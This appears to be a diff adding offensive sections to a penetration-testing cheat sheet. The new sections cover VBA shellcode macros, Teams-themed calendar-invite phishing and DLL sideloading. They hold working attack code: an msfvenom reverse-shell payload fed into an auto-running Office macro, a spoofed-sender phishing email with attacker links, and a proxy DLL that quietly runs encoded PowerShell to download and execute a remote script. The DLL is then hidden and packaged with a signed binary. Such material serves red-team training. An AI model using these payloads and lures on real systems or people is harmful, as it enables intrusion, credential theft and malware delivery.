@@ -161,6 +161,118 @@ snmpwalk -c public -v1 -t 10 192.168.50.151
 ## Phishing
 
 <details>
+<summary> MS Office </summary>
+
+In order to evade detection, calling Win32 APIs from VBA can be a powerful method of leveraging VBA outside of the more typical malicious macros. 
+
+First we can grab our shellcode from msfvenom 
+
+``` bash
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f vbapplication
+```
+
+We can then drop this shellcode into a VBA macro. To work as expected, this requires a matching 64-bit multi/handler in Metasploit with EXITFUNC set to "thread" and a matching IP and port number.
+
+``` VBA
+Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
+
+Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+
+Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
+
+Function MyMacro()
+    Dim buf As Variant
+    Dim addr As LongPtr
+    Dim counter As Long
+    Dim data As Long
+    Dim res As LongPtr
+    
+    buf = Array(252,72,131,228,240,232,204,0,0,0,65,81,65,80,82,72,49,210,81,101,72,
+    ...
+    06,0,89,187,224,29,42,10,65,137,218,255,213)
+
+    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
+    
+    For counter = LBound(buf) To UBound(buf)
+        data = buf(counter)
+        res = RtlMoveMemory(addr + counter, data, 1)
+    Next counter
+    
+    res = CreateThread(0, 0, addr, 0, 0, 0)
+End Function 
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+```
+
+</details>
+
+<details>
+<summary> Calendar Invites </summary>
+
+The iCalendar (ICS) format is a widely accepted standard and is essentially a plain text file that follows a specific syntax to represent calendar events.
+
+We can create a .ics template 
+
+``` ics
+BEGIN:VCALENDAR
+PRODID:Microsoft Exchange Server 2022
+VERSION:2.0
+CALSCALE:GREGORIAN
+METHOD:REQUEST
+BEGIN:VTIMEZONE
+TZID:UTC
+BEGIN:STANDARD
+DTSTART:20241010T073659Z
+TZOFFSETFROM:+0000
+TZOFFSETTO:+0000
+END:STANDARD
+END:VTIMEZONE
+BEGIN:VEVENT
+DTSTART;TZID=UTC:20241010T073059Z
+DTEND;TZID=UTC:20241010T083059Z
+DTSTAMP:20241010T034159Z
+ORGANIZER;CN=Peter:mailto:peter@corp1.com
+UID:FIXMEUID20241010T034159Z
+CREATED:20241010T034159Z
+DESCRIPTION:http://meeting.corp1.com
+LAST-MODIFIED:20241010T034159Z
+LOCATION:Microsoft Teams Meeting
+SEQUENCE:0
+STATUS:CONFIRMED
+SUMMARY:HR meeting
+TRANSP:OPAQUE
+END:VEVENT
+END:VCALENDAR
+```
+
+and craft an email using html that resembles a microsoft teams invite 
+
+``` html
+<p class=MsoNormal style='background:white'><span style='color:black'>We are reaching out to inform you of an urgent meeting scheduled by the HR Department that requires your immediate attention.<u1:p>&nbsp;<o:p></o:p></span></u1:p></p>
+<p class=MsoNormal style='background:white'><span style='color:#5F5F5F'>________________________________________________________________________________</span><span style='mso-fareast-font-family:"Times New Roman";color:black'> <u1:p>&nbsp;</u1:p></span><span style='color:black'><o:p></o:p></span></p>
+<p class=MsoNormal style='background:white'><span style='font-size:18.0pt; font-family:"Segoe UI",sans-serif;color:#252424'>Microsoft Teams meeting</span><span style='font-family:"Segoe UI",sans-serif;color:#252424'> <u1:p>&nbsp;</u1:p></span><span style='color:black'><o:p></o:p></span></p>
+<p class=MsoNormal style='background:white'><b><span style='font-size:10.5pt; font-family:"Segoe UI",sans-serif;color:#252424'>Join on your computer or mobile app</span></b><b><span style='font-family:"Segoe UI",sans-serif; color:#252424'> <u1:p>&nbsp;</u1:p></span></b><span style='color:black'><o:p></o:p></span></p>
+<p class=MsoNormal style='background:white'><span style='font-family:"Segoe UI",sans-serif; color:#252424'><a href="[ATTACKER_URL]" target="_blank"><span style='font-size:10.5pt;font-family:"Segoe UI Semibold",sans-serif; color:#6264A7'>Click here to join the meeting</span></a> <u1:p>&nbsp;</u1:p></span><span style='color:black'><o:p></o:p></span></p>
+<p class=MsoNormal style='background:white'><span style='font-family:"Segoe UI",sans-serif; color:#252424'><a href="[ATTACKER_URL]" target="_blank"><span style='font-size:10.5pt;color:#6264A7'>Learn More</span></a> | <a href="[ATTACKER_URL]" target="_blank"><span style='font-size:10.5pt;color:#6264A7'>Meeting options</span></a><u1:p>&nbsp;</u1:p></span><span style='color:black'><o:p></o:p></span></p>
+<p class=MsoNormal style='background:white'><span style='color:#5F5F5F'><span style='opacity:.36'>________________________________________________________________________________</span></span><span style='mso-fareast-font-family:"Times New Roman";color:black'> <u1:p>&nbsp;</u1:p></span><span style='color:black'><o:p></o:p></span></p>
+```
+
+Then we can send the email using an SMTP server that we have setup, spoofing the sender's address
+
+``` bash
+sendEmail -s 192.168.50.121 -t victim@corp1.com -f attacker@corp1.com -u "Urgent HR meeting"  -o message-content-type=html -o message-file=./email.html -a iCalendar.ics
+```
+
+</details>
+
+<details>
 <summary> Website Cloning </summary>
 
 We’ll use -E to adjust file extensions to match MIME types, -k to convert links to local copies, and -K to save originals with a .orig extension. With -p, we’ll grab all assets needed to view the page. The -e robots=off option ignores robots.txt. We’ll allow external host downloads with -H, but restrict them to the zoom.us domain via -Dzoom.us. Finally, -nd saves everything in a flat directory in the current working directory.
@@ -601,6 +713,97 @@ use 1b
 </details>
 
 ## Evasion
+
+<details>
+<summary> DLL Sideloading </summary>
+
+By packaging a microsoft signed binary that attempts to call DLLs from the current working directory, we can create our own DLL that proxies legeitmate calls to the real DLL, while executing our malicious code. 
+
+Fist, we can use procmon to find microsoft binaries that attempt to load several DLLs from the current working directory.
+
+Then, using this tool (https://github.com/mrexodia/perfect-dll-proxy) we can parse the export table of the original DLL and automatically generates a proxy DLL that exports all the same functions, forwarding each call to the legitimate library. 
+
+``` bash 
+python perfect_dll_proxy.py secur32.dll
+```
+
+This tool will output a .cpp file with all of the necessary DLL calls proxied. The DllMain() function is currently a stub, and doesn't do anything when the DLL is loaded, so we need to add our payload within the DLL_PROCESS_ATTACH case inside DllMain(). 
+
+Here is an example of executing a PowerShell payload in a hidden window using the CreateProcessA API, which uses a command line parameter documented here (https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)
+
+``` cpp
+#include "pch.h"
+
+#include <Windows.h>
+
+#ifdef _WIN64
+#define DLLPATH "\\\\.\\GLOBALROOT\\SystemRoot\\System32\\secur32.dll"
+#else
+#define DLLPATH "\\\\.\\GLOBALROOT\\SystemRoot\\SysWOW64\\secur32.dll"
+#endif // _WIN64
+
+#pragma comment(linker, "/EXPORT:AcceptSecurityContext=" DLLPATH ".AcceptSecurityContext")
+#pragma comment(linker, "/EXPORT:AcquireCredentialsHandleA=" DLLPATH ".AcquireCredentialsHandleA")
+#pragma comment(linker, "/EXPORT:AcquireCredentialsHandleW=" DLLPATH ".AcquireCredentialsHandleW")
+#pragma comment(linker, "/EXPORT:AddCredentialsA=" DLLPATH ".AddCredentialsA")
+#pragma comment(linker, "/EXPORT:AddCredentialsW=" DLLPATH ".AddCredentialsW")
+...
+#pragma comment(linker, "/EXPORT:TranslateNameW=" DLLPATH ".TranslateNameW")
+#pragma comment(linker, "/EXPORT:UnsealMessage=" DLLPATH ".UnsealMessage")
+#pragma comment(linker, "/EXPORT:VerifySignature=" DLLPATH ".VerifySignature")
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
+{
+    switch (fdwReason)
+    {
+        case DLL_PROCESS_ATTACH:
+    {
+        STARTUPINFOA si = { 0 };
+        PROCESS_INFORMATION pi = { 0 };
+        si.cb = sizeof(si);
+        si.dwFlags = STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_HIDE;
+
+        CreateProcessA(
+            NULL,
+            (LPSTR)"cmd.exe /c powershell -ep bypass -enc  KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADIANQAxAC4AMQA1ADEALwByAHUAbgAuAHQAeAB0ACcAKQAgAHwAIABJAEUAWAA=",
+            NULL,
+            NULL,
+            FALSE,
+            CREATE_NO_WINDOW,
+            NULL,
+            NULL,
+            &si,
+            &pi
+        );
+
+    }
+        case DLL_THREAD_ATTACH:
+            break;
+        case DLL_THREAD_DETACH:
+            break;
+        case DLL_PROCESS_DETACH:
+            break;
+    }
+    return TRUE;
+}
+```
+
+Next, we compile the new x64 Release binary and move the resulting DLL to a directory containing just the microsoft binary. 
+
+To further add to the stealth of this payload, we will make the dll file hidden
+
+``` cmd
+attrib +h secur32.dll
+```
+
+Then we can package the contents 
+
+``` powershell 
+"C:\Program Files\7-Zip\7z.exe" a -tzip onedrive.zip .\OneDrive.exe .\secur32.dll
+```
+
+</details>
 
 <details>
 <summary> shellter </summary>
